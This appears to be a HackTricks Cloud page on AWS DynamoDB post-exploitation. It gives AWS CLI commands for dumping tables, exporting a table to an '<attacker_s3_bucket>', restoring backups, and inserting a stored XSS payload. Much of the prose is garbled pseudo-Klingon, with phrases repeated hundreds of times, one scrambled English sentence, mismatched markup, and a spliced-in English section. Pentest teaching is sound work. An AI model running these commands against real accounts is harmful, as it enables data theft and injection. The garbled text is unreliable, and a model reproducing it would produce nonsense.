# AWS - DynamoDB Post Exploitation

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## DynamoDB

For more information check:

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

An attacker with this permissions will be able to **get items from tables by the primary key** (you cannot just ask for all the data of the table). This means that you need to know the primary keys (you can get this by getting the table metadata (`describe-table`).

{% tabs %}
{% tab title="json file" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}



**Potential Impact:** Indirect privesc by locating sensitive information in the table

### `dynamodb:GetItem`

**Similar to the previous permissions** this one allows a potential attacker to read values from just 1 table given the primary key of the entry to retrieve:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
{% endcode %}

**`transact-get-items`** method vItlhutlh. vaj permission vItlhutlh.
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Qapla'!** QaD privesc vItlhutlh vItlhutlh table vItlhutlh sensitive information lo'laHbe'chugh attacker potential. 

### `dynamodb:Query`

**vItlhutlh permissions previous Similar** vItlhutlh allows attacker potential vItlhutlh values read. entry primary key given table 1 just from. [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html) use allows, comparison allowed only primary key (appear must) "EQ" is, so request a in DB whole the get to comparison use cannot. 

{% tabs %}
{% tab title="json file" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potential Impact:** Indirect privesc by locating sensitive information in the table

### `dynamodb:Scan`

**ghItlh:** **table vItlhutlh** **ghItlhmeH** **jatlhlaHbe'.**
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Qa'legh:** Qa'leghvam vItlhutlhlaHbe'chugh, table vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vIt
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
vaj vItlhutlh `batch-execute-statement` vItlhutlhmeH vItlhutlh.
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
**ghItlh:** pagh primary key vItlhutlh, vaj vItlhutlh 'e' vItlhutlh, 'ach vItlhutlh vItlhutlh.

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

**qoHtaHvIS:** S3 bucket vItlhutlh table pagh vItlhutlh **export** 'e' vItlhutlh.
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
**Note**: *ghItlhvam vItlhutlh.* *table* *DochmeyDaq* *point-in-time-recovery* *jIyItlh.* *table* *DochmeyDaq* *jImej* *qaStaHvIS* *yIlo'laH* *jatlh*:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
**qaStaHvIS, vaj** **enable** **vItlhutlh** **'ej** **'e'** **permission** **`dynamodb:ExportTableToPointInTime`** **vIleghlaH**.
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Qa'legh:** Qa'leghvam vItlhutlhlaHbe'chugh, table vItlhutlhlaHbe'chugh, 'ej (backup vItlhutlhlaHbe'chugh) 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej 'ej '
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Qapla'!** **QaD jImej:** QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq 'ej QaD jImejDaq '
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{% code %}
{% endtab %}
{% endcode %}

{% code-tabs %}
{% code-tabs-item title="Klingon" %}
# AWS DynamoDB Post-Exploitation

## Table Enumeration

To enumerate the tables in DynamoDB, you can use the `ListTables` API call. This will return a list of all the tables in the current AWS account.

```bash
aws dynamodb list-tables
```

## Table Data Dump

To dump the data from a specific table, you can use the `Scan` API call. This will return all the items in the table.

```bash
aws dynamodb scan --table-name <table-name>
```

## Table Metadata

To get the metadata of a specific table, you can use the `DescribeTable` API call. This will return information such as the table name, attribute definitions, and key schema.

```bash
aws dynamodb describe-table --table-name <table-name>
```

## Table Item Manipulation

To manipulate the items in a table, you can use the `PutItem`, `UpdateItem`, and `DeleteItem` API calls. These calls allow you to add, update, and delete items in the table.

```bash
aws dynamodb put-item --table-name <table-name> --item <item-json>
aws dynamodb update-item --table-name <table-name> --key <key-json> --update-expression <update-expression> --expression-attribute-values <expression-attribute-values>
aws dynamodb delete-item --table-name <table-name> --key <key-json>
```

## Table Indexes

To get the indexes of a specific table, you can use the `DescribeTable` API call. This will return information such as the index name, key schema, and projection.

```bash
aws dynamodb describe-table --table-name <table-name>
```

## Table Backup and Restore

To create a backup of a table, you can use the `CreateBackup` API call. This will create a backup of the table in the current AWS account.

```bash
aws dynamodb create-backup --table-name <table-name> --backup-name <backup-name>
```

To restore a table from a backup, you can use the `RestoreTableFromBackup` API call. This will restore the table from the specified backup.

```bash
aws dynamodb restore-table-from-backup --target-table-name <table-name> --backup-arn <backup-arn>
```

## Conclusion

In this section, we have explored various post-exploitation techniques for AWS DynamoDB. These techniques allow you to enumerate tables, dump table data, manipulate table items, retrieve table metadata, and perform table backup and restore operations. Understanding these techniques can help you gain valuable information and control over DynamoDB instances during a penetration test or security assessment.
{% endcode %}
{% endtab %}
{% endcode-tabs %}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potential Impact:** Exploitation of further vulnerabilities/bypasses by being able to add/modify data in a DynamoDB table

### `dynamodb:UpdateItem`

